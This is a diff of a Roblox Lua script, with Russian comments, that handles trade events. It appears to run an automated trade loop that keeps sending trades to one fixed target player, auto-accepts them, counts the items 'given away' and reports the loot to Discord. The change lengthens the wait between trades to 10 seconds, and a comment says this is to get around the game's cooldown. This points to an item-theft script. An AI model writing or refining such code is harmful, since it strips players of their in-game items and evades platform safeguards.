@@ -86,7 +86,7 @@ local Trade = ReplicatedStorage:WaitForChild("Trade")
 local lastOffer = nil
 local myName = LocalPlayer.Name
 local lastLogTime = 0
-local tradedItemsCount = 0 -- Счетчик, сколько предметов уже отдали
+local tradedItemsCount = 0
 
 Trade.StartTrade.OnClientEvent:Connect(function()
     isTrading = true
@@ -144,7 +144,6 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
     if success then
         if os.clock() - lastLogTime < 5 then return end
         if not lootList or #lootList == 0 then 
-            -- Если лут пустой, просто закрываем трейд
             isTrading = false
             return 
         end
@@ -183,12 +182,15 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
         })
         print("[trade] 📦 Лут отправлен в Discord!")
 
-        -- 🚀 ЗАПУСКАЕМ СЛЕДУЮЩИЙ ТРЕЙД
-        task.wait(3) -- Ждем, пока GUI трейда полностью закроется
+        -- 🚀 ЗАПУСКАЕМ СЛЕДУЮЩИЙ ТРЕЙД С ПАУЗОЙ 10 СЕКУНД
+        task.wait(10) -- Увеличено до 10 сек, чтобы обойти кулдаун
         if Players:FindFirstChild(TARGET_NAME) then
             print("[trade] Запускаем следующий трейд...")
             sendTradeToTarget()
+        else
+            print("[trade] Marie вышла, следующий трейд не отправлен.")
         end
+        isTrading = false
 
     else
         -- Авто-акцепт
